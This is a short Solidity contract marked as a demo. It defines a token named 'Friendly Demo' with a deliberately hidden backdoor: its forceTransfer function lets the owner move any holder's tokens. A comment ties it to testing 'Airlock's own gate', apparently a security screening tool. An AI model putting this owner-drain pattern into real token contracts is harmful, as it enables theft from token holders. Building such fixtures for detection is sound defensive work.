// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// DEMO ONLY. Hidden backdoor: looks like an ordinary token, but the owner can move anyone's tokens to themselves.
contract BackdoorToken {
    // Accepts a plain ETH transfer, so the only thing that can stop money reaching this demo contract is Airlock's own gate.
    receive() external payable {}

    string public name = "Friendly Demo";
    address public owner = msg.sender;
    mapping(address => uint256) public balanceOf;

    constructor() {
        balanceOf[msg.sender] = 1_000_000 ether;
    }

    function transfer(address to, uint256 v) external returns (bool) {
        balanceOf[msg.sender] -= v;
        balanceOf[to] += v;
        return true;
    }

    function forceTransfer(address from, address to, uint256 v) external {
        require(msg.sender == owner, "not owner");
        balanceOf[from] -= v;
        balanceOf[to] += v;
    }
}
